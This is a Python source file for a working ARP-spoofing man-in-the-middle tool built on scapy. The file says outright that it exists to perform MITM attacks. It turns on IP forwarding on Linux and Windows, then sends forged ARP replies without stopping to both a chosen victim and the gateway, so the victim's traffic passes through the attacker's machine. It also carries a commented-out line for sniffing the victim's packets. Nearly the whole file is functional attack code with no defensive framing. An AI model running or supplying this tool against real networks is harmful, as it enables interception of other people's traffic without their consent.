from scapy.all import ARP, send, sniff
import ui, platform, subprocess
from time import sleep


windows_execute_ip_forward_check = "Get-NetIPInterface | select InterfaceAlias,AddressFamily,Forwarding | findstr Wi-Fi" #gets ipv4 and/or ipv6 forwarding status
windows_execute_ip_forward_switch = "Set-NetIPInterface -InterfaceAlias Wi-Fi -Forwarding Enabled" #enables ipv4 and/or ipv6 forwarding

def IPForward_switch():
    if platform.system() == "Linux":
        if "0" in open("/proc/sys/net/ipv4/ip_forward", 'r').read():
            ui.uprint("Enabling ip forwarding for linux")
            f = open("/proc/sys/net/ipv4/ip_forward", "r+")
            f.truncate(0)
            f.write("1")
            f.close()
        else:
            ui.uprint("Disabling ip forwarding",char="-")
            f = open("/proc/sys/net/ipv4/ip_forward", "r+")
            f.truncate(0)
            f.write("0")
            f.close()
    elif platform.system() == "Windows":
        if "Enabled" in subprocess.Popen(["powershell", windows_execute_ip_forward_check], stdout=subprocess.PIPE, shell=True).communicate()[0].decode("utf-8"):
            ui.uprint("Disabling ip forwarding for windows")
            subprocess.Popen(["powershell", windows_execute_ip_forward_switch.replace("Enabled", "Disabled")], stdout=subprocess.PIPE, shell=True)
        else:
            ui.uprint("Enabling ip forwarding for windows")
            subprocess.Popen(["powershell", windows_execute_ip_forward_switch], stdout=subprocess.PIPE, shell=True)
    elif platform.system() == "Darwin":
        ui.uprint("OSX solutions comming soon",char="!")


def IPForward_status():
    """
    just for linux and windows atm
    """
    if platform.system() == "Linux":
        if "0" in open("/proc/sys/net/ipv4/ip_forward", 'r').read():
            return True #is off
        return False #is on
    elif platform.system() == "Windows":
        if "Enabled" in subprocess.Popen(["powershell", windows_execute_ip_forward_check], stdout=subprocess.PIPE, shell=True).communicate()[0].decode("utf-8"):
            return False
        return True
    return None #something came wrong

class mitm:
    """
    This class is made to perform mitm attacks using scapy
    """

    def __init__(self):
        self.victim_ip = self.victim_mac = self.gateway_ip = self.gateway_mac = None
        self.dump = []

    def start(self):
        if self.victim_ip == None or self.victim_mac == None or self.gateway_ip == None or self.gateway_mac == None:
            ui.uprint("No target selected",char="!")
            return
        if IPForward_status():
            IPForward_switch()
        ui.uprint("Starting MITM attack")
        try:
            while True:
                send(ARP(op=2, pdst=self.victim_ip, psrc=self.gateway_ip, hwdst=self.victim_mac), verbose=False) #send to victim
                send(ARP(op=2, pdst=self.gateway_ip, psrc=self.victim_ip, hwdst=self.gateway_mac), verbose=False) #send to gateway
                # pkts = sniff(prn=lambda x:x.sprintf("{IP:%IP.src% -> %IP.dst%}"), filter=f"ip host {self.victim_ip} and not arp")
                # uncommenting the above line will make the program sniff the packets and print them to the screen.
                # it could be useful for debugging purposes or to program a little bit of extra functionalities
                # but I highly recommend using wireshark for the packet shelling since it's way more convenient and it's a lot more powerful / complete
                sleep(1.5)

        except KeyboardInterrupt:
            ui.uprint("Stopping MITM attack")
            IPForward_switch()
            sleep(1)
            ui.clear()

if __name__ == "__main__":
    """
    If anything goes wrong and you need to check your ip forwarding status just run this file.
    """
    print("Current ip forwarding status: ", ("off" if IPForward_status() else "on"))
